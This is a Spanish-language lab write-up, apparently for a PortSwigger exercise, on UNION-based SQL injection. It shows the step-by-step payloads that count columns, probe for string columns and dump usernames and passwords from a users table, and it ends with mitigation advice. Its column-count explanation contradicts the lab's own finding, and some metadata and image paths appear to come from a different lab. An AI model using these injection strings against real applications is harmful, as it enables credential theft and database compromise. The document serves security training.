---
title: "Ataque UNION de inyección SQL, recuperando datos de otras tablas"
platform: "PortSwigger"
os: "Windows"
difficulty: "Medium"
ip: "10.10.10.XXX"
slug: "ataque-union-de-inyeccion-sql-recuperando-datos-de-otras-tablas"
author: "Z4k7"
date: "2026-03-02"
year: "2026"
status: "pwned"
tags:
  - "SQLi"
  - "UnionAttack"
  - "Database"
  - "OracleDB"
techniques:
  - "SQLi"
  - "UnionAttack"
  - "Database"
  - "OracleDB"
tools:
  - "Burpsuite"
flags_list:
  - label: "usuario"
    value: "administrator"
  - label: "password"
    value: "qxfd03y8843qcubux672"
summary: "La vulnerabilidad de inyección SQL (SQLi) ocurre cuando una aplicación web construye consultas dinámicas sin sanitizar adecuadamente la entrada del usuario. En este laboratorio, el parámetro de categoría de productos es vulnerable, permitiendo manipular la consulta SQL original.   El ataque UNION-based SQLi aprovecha la capacidad de combinar resultados de múltiples  consultas, lo que permite extraer información sensible de otras tablas como users."
steps:

  - id: "exploit"
    num: "01"
    title: "Objetivo"
    content:
      - kind: "note"
        text: |
          Este laboratorio contiene una vulnerabilidad de inyección SQL en el filtro de categorías de productos. Los resultados de la consulta se devuelven en la respuesta de la aplicación, por lo que se puede usar un ataque UNION para recuperar datos de otras tablas. Para construir dicho ataque, es necesario combinar algunas de las técnicas aprendidas en laboratorios anteriores.
          La base de datos contiene una tabla diferente llamada `users`, con columnas llamadas `username` y `password`.
          Para resolver el laboratorio, realice un ataque UNION de inyección SQL que recupere todos los nombres de usuario y contraseñas, y use la información para iniciar sesión como `administrator`usuario.

  - id: "recon"
    num: "02"
    title: "Reconocimiento"
    content:
      - kind: "note"
        text: |
          Prueba inicial con `'--` confirma la inyección:
      - kind: "code"
        lang: "SQL"
        code: |
          '--
      - kind: "image"
        src: "assets/images/Ataque%20de%20inyección%20SQL,%20listando%20el%20contenido%20de%20la%20base%20de%20datos%20en%20Oracle/file-20260311142644931.jpg"
        caption: "Evidencia técnica"
      - kind: "callout"
        type: "info"
        label: "Evidencia Técnica"
        text: "El comentario SQL interrumpe la consulta, confirmando que la entrada es interpretada directamente por el motor SQL."
      - kind: "note"
        text: |
          Enumeración de columnas con `ORDER BY`:
      - kind: "code"
        lang: "SQL"
        code: |
          '+ORDER+BY+1,2-- -- Éxito 
          '+ORDER+BY+1,2,3-- -- Erro
      - kind: "image"
        src: "assets/images/Ataque%20de%20inyección%20SQL,%20listando%20el%20contenido%20de%20la%20base%20de%20datos%20en%20Oracle/file-20260311142730399.jpg"
        caption: "Evidencia técnica"
      - kind: "callout"
        type: "info"
        label: "Evidencia Técnica"
        text: "El fallo confirma que la consulta devuelve 2 columnas."

  - id: "exploit"
    num: "03"
    title: "Explotación"
    content:
      - kind: "note"
        text: |
          Validar con UNION SELECT:
      - kind: "code"
        lang: "SQL"
        code: |
          UNION SELECT NULL--   -- Error
          UNION SELECT NULL,NULL--   -- Éxito
          UNION SELECT NULL,NULL,NULL--   -- Error
      - kind: "image"
        src: "assets/images/Ataque%20UNION%20de%20inyección%20SQL,%20recuperando%20datos%20de%20otras%20tablas/file-20260311151057271.jpg"
        caption: "Evidencia técnica"
      - kind: "callout"
        type: "info"
        label: "Evidencia Técnica"
        text: "El ataque UNION requiere exactamente 2 columnas para funcionar."
      - kind: "note"
        text: |
          Identificar columnas compatibles con datos de cadena
      - kind: "code"
        lang: "SQL"
        code: |
          UNION SELECT 'a',NULL-- -- Éxito  
          UNION SELECT NULL,'a'-- -- Éxito  
          UNION SELECT 'a','a'-- -- Éxito
      - kind: "image"
        src: "assets/images/Ataque%20UNION%20de%20inyección%20SQL,%20recuperando%20datos%20de%20otras%20tablas/file-20260311151145735.jpg"
        caption: "Evidencia técnica"
      - kind: "image"
        src: "assets/images/Ataque%20UNION%20de%20inyección%20SQL,%20recuperando%20datos%20de%20otras%20tablas/file-20260311151204930.jpg"
        caption: "Evidencia técnica"
      - kind: "callout"
        type: "info"
        label: "Evidencia Técnica"
        text: "Ambas columnas aceptan datos tipo string, lo que permite extraer credenciales."
      - kind: "note"
        text: |
          Extracción de datos sensibles:
          Podemos validar que tenemos acceso para ingresar código en las dos columnas sin problema alguno  Validando el reporte del laboratorio ya contamos con las columnas solo queda validar como se extrae la información de dichas columnas para poder tener el usuario  `administrator`
      - kind: "code"
        lang: "SQL"
        code: |
          UNION SELECT username, password FROM users--
      - kind: "image"
        src: "assets/images/Ataque%20UNION%20de%20inyección%20SQL,%20recuperando%20datos%20de%20otras%20tablas/file-20260311151318199.jpg"
        caption: "Evidencia técnica"

  - id: "flag_01"
    type: "flag"
    flag_items:
      - label: "usuario"
        value: "administrator"
      - label: "password"
        value: "qxfd03y8843qcubux672"

  - id: "flag_01_post"
    num: ""
    title: "Post Flag"
    content:
      - kind: "image"
        src: "assets/images/Ataque%20UNION%20de%20inyección%20SQL,%20recuperando%20datos%20de%20otras%20tablas/file-20260311151544808.jpg"
        caption: "Evidencia técnica"
      - kind: "note"
        text: |
          >[!INFO] Evidencia Técnica
          >Se obtienen credenciales válidas del usuario `administrator`.

  - id: "step4"
    num: "04"
    title: "Informacion"
    content:
      - kind: "note"
        text: |
          Cuando se realiza un ataque `UNION` de inyección SQL, hay dos métodos efectivos para determinar cuántas columnas se devuelven de la consulta original.
          `ORDER BY` y `UNION SELECT`
          Para aplicar el primer método de  la inyección aplicando la palabra clave `ORDER BY` de eta manera se podría calcular las columnas disponibles  Por ejemplo, si el punto de inyección es una cadena entre comillas dentro de la `WHERE`cláusula de la consulta original, enviarías:
      - kind: "code"
        lang: "SQL"
        code: |
          ' ORDER BY 1-- 
          ' ORDER BY 2-- 
          ' ORDER BY 3-- 
          etc.
      - kind: "note"
        text: |
          Par validar que real mente se a capturado o calculado la cantidad de columnas disponibles en la BD ,la base de datos devuelve un error, como el siguiente
          Validación con UNION SELECT
          Se prueban combinaciones con `NULL` para ajustar el número de columnas:
      - kind: "code"
        lang: "SQL"
        code: |
          UNION SELECT NULL--   -- Error
          UNION SELECT NULL,NULL--   -- Error
          UNION SELECT NULL,NULL,NULL--   -- Éxito
      - kind: "callout"
        type: "info"
        label: "Evidencia Técnica"
        text: "La consulta con tres valores `NULL` se ejecuta correctamente, confirmando que la tabla devuelve 3 columnas."
      - kind: "note"
        text: |
          El segundo método implica presentar una serie de `UNION SELECT`cargas útiles que especifican un número diferente de valores nulos:
      - kind: "code"
        lang: "SQL"
        code: |
          UNION SELECT NULL-- 
           UNION SELECT NULL,NULL-- 
           UNION SELECT NULL,NULL,NULL--
      - kind: "note"
        text: |
          En este caso el lo contrario no es validar el error sino salir del erro cada vez que agregas un null se espera escapara del siguiente error.
      - kind: "callout"
        type: "danger"
        label: "SQL ERROR"
        text: "All queries combined using a UNION, INTERSECT or EXCEPT operator must have an equal number of expressions in their target lists."
      - kind: "callout"
        type: "info"
        label: "TIP"
        text: "En exámenes y auditorías, recuerda: ORDER BY → UNION SELECT → Identificar columnas → Extraer datos sensibles."

lessons:
  - 'Siempre validar número de columnas antes de intentar extraer datos.'
  - 'Identificar columnas compatibles con strings es clave para obtener resultados visibles.'
  - 'En auditorías reales, este tipo de vulnerabilidad puede llevar a comprometer credenciales críticas y acceso total al sistema.'
mitigation:
  - 'Implementar prepared statements o parametrización.'
  - 'Restringir mensajes de error detallados.'
  - 'Validar y sanitizar entradas de usuario.'
  - 'Aplicar principio de mínimo privilegio en cuentas de base de datos.'
  - 'Monitorear patrones de consultas anómalas (`UNION`, `ORDER BY`, `--`).'
---
